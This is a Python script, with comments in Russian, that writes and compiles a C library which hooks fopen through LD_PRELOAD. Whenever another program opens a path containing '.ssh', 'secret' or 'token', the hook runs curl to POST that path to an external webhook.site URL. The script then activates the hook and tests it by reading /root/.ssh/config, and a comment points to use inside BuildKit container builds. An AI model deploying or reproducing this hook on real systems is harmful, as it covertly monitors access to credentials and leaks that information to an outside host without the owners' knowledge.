import os
import subprocess

WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"
LIB_PATH = "/tmp/hook.so"

def setup_hook():
    # 1. Создаем исходник хука на C
    # Мы перехватываем fopen, чтобы видеть, какие файлы открывают другие программы
    hook_code = f"""
    #define _GNU_SOURCE
    #include <dlfcn.h>
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    typedef FILE *(*orig_fopen_type)(const char *path, const char *mode);

    FILE *fopen(const char *path, const char *mode) {{
        orig_fopen_type orig_fopen = (orig_fopen_type)dlsym(RTLD_NEXT, "fopen");
        
        // Если кто-то пытается открыть SSH ключи или секреты — шлем сигнал
        if (strstr(path, ".ssh") || strstr(path, "secret") || strstr(path, "token")) {{
            char cmd[512];
            snprintf(cmd, sizeof(cmd), "curl -s -X POST -d 'FILE_ACCESS_ATTEMPT=%s' {WEBHOOK_URL}", path);
            system(cmd);
        }}
        
        return orig_fopen(path, mode);
    }}
    """

    with open("/tmp/hook.c", "w") as f:
        f.write(hook_code)

    # 2. Компилируем библиотеку
    # -fPIC и -shared нужны для создания динамической библиотеки
    # -ldl нужен для работы с dlsym
    compile_cmd = f"gcc -shared -fPIC /tmp/hook.c -o {LIB_PATH} -ldl"
    
    if os.system(compile_cmd) != 0:
        return "[!] Compilation failed. Make sure 'gcc' is installed."

    # 3. Активируем хук через переменную окружения
    os.environ["LD_PRELOAD"] = LIB_PATH
    
    # 4. Тестируем: вызываем команду, которая обращается к файлам
    # Даже обычный 'cat' теперь будет триггерить наш curl
    print(f"[+] Hook compiled at {LIB_PATH}")
    print("[*] Testing hook with 'cat /root/.ssh/config'...")
    os.system("cat /root/.ssh/config > /dev/null 2>&1")
    
    return "[+] Hook active and tested."

if __name__ == "__main__":
    # Если gcc нет, попробуем использовать clang
    if os.system("which gcc > /dev/null") != 0:
        print("[-] GCC not found, checking for CLANG...")
        # (в BuildKit часто нет компиляторов, если это не build-image)
    
    status = setup_hook()
    print(status)
